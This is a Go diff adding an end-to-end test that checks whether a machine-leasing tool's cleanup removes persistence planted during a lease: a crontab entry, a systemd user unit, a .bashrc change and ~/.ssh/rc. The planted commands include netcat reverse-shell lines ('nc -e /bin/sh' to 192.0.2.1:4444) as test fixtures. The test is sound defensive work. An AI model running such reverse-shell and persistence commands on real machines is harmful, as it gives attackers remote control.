@@ -4,6 +4,7 @@ package e2e
 
 import (
 	"regexp"
+	"slices"
 	"strings"
 	"sync"
 	"testing"
@@ -182,5 +183,44 @@ func TestJobCommandNotFound(t *testing.T) {
 	r := f.e.hostel("run", "--", "no-such-command-hostel", "x")
 	if r.code != 127 || !strings.Contains(r.stdout+r.stderr, "no-such-command-hostel: command not found in the job PATH") {
 		t.Fatalf("job with a missing command: %s", r)
+	}
+}
+
+// TestCleanupPersistence (M11): cleanup restores the persistence locations of
+// the machine user (a crontab entry, a systemd user unit, a changed shell
+// startup file, ~/.ssh/rc) and names them in the event log.
+func TestCleanupPersistence(t *testing.T) {
+	t.Parallel()
+	f := newFixture(t, nil)
+	f.c.sh("echo '# base' | crontab -u hostel -")
+	bashrc := f.c.sh("cat /home/hostel/.bashrc")
+	lease := f.acquire()
+	f.e.mustHostel("run", "--", `echo '* * * * * nc -e /bin/sh 192.0.2.1 4444' | crontab - && `+
+		`mkdir -p ~/.config/systemd/user && printf '[Service]\nExecStart=/bin/sleep 1000\n' > ~/.config/systemd/user/door.service && `+
+		`echo 'nc 192.0.2.1 4444 &' >> ~/.bashrc && echo 'true door' > ~/.ssh/rc && chmod 000 ~/.config/systemd/user`)
+	f.e.mustHostel("release")
+	f.waitRoomFree()
+	if got := f.c.sh("crontab -l -u hostel 2>&1 || true"); got != "# base" {
+		t.Fatalf("crontab after cleanup: %s", got)
+	}
+	if got := f.c.sh("ls -a /home/hostel/.config/systemd/user /home/hostel/.ssh/rc 2>&1 || true"); strings.Contains(got, "door") || !strings.Contains(got, "No such file") {
+		t.Fatalf("unit and ~/.ssh/rc after cleanup: %s", got)
+	}
+	if got := f.c.sh("cat /home/hostel/.bashrc"); got != bashrc {
+		t.Fatalf(".bashrc after cleanup: changed")
+	}
+	var d protocol.MachineDetails
+	if code := f.s.get("/v1/machines/home/box", f.s.token, &d); code != 200 {
+		t.Fatalf("GET /v1/machines/home/box: HTTP %d", code)
+	}
+	want := "removed persistence of the lease: crontab, ~/.bashrc, ~/.config/systemd/user, ~/.ssh/rc"
+	if !slices.ContainsFunc(d.Events, func(e protocol.Event) bool { return e.LeaseID == lease && e.Message == want }) {
+		t.Fatalf("events without %q: %+v", want, d.Events)
+	}
+	// The units are not started: the machine container has no user manager.
+	// The next lease starts with the restored state.
+	f.acquire()
+	if r := f.e.mustHostel("run", "--", "crontab -l 2>&1; ls -R ~/.config/systemd 2>&1"); strings.Contains(r.stdout, "192.0.2.1") || strings.Contains(r.stdout, "door") {
+		t.Fatalf("the next lease sees the persistence: %s", r.stdout)
 	}
 }
